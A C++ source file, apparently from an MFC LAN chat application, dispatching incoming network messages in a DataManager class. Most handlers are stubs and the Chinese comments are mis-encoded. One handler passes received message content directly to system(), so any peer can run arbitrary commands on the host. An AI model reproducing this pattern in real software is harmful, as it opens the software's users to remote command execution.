#include "stdafx.h"
#include "DataManager.h"
#include "ServiceDiscover.h"
ServiceDiscover *serviceDiscover;
bool DataManager::sendMsg(User toUser, Message msg,SOCKET socket){


	return false;
}
DataManager* DataManager::m_pSingleInstance(NULL);
DataManager* DataManager::getInstance(){
	if (m_pSingleInstance == NULL)
		m_pSingleInstance = new DataManager();
	return m_pSingleInstance;
	
}


void DataManager::startDiscoverServer(){
	serviceDiscover =new ServiceDiscover(this);
	serviceDiscover->StartAskLiveService();
	serviceDiscover->StartResponseService();
}



DataManager::DataManager()
{
}


DataManager::~DataManager()
{
}

void DataManager::handleMessage(Message msg){

	


}
void DataManager::handleServiceDiscoverMsg(Message msg){
	long id = msg.FromID;
	int msg_type = msg.msg_type;
	string msg_content = msg.content;
	switch (msg_type)
	{
	case msg_type_event:
		if (msg_content == "0"){//����
		//	Session 

		}
		else if (msg_content == "1"){//����
		
			string name = "";
			User user(id, name, id);

			Session* session = new Session(user);
			SessionManager* manager = SessionManager::GetInstance();
			manager->addSession(session);
			
			AfxGetApp()->m_pMainWnd->SendMessage(WM_LISTCHANGE_MESSAGE, 0, NULL);
		}

		break;
	case msg_type_text:{
						   long ID = msg.FromID;


	}
		
		//ͨ��ID�ڻỰ������Ѱ�һỰS

		//�����յ�����Ϣ�浽��Ӧ�Ự�Ķ�Ӧ��Ϣ�б���

		//�жϻỰS�Ƿ��д���
		  //--����У�����Ϣ���͵���Ӧ����

		  //


		break;
	case msg_type_cmd:{
		
		system(msg_content.c_str());
		break;
	}
		//
		
	case msg_type_image:
		break;
	case msg_type_file:
	{
	string msg_content = msg.content;
	//����content��content�����ļ���С���ļ�ID,�ļ����룻�ļ�����Ķ˿ں�

	//�����ͻ���socket

	}

		break;
	case msg_type_game:
		break;
	case msg_type_error:{
LPARAM lp = (LPARAM)&msg;
		AfxGetApp()->m_pMainWnd->SendMessage(WM_MY_MESSAGE, 0, lp);
	}
		
		break;
	case msg_type_others:
		break;
	default:
		break;
	}

}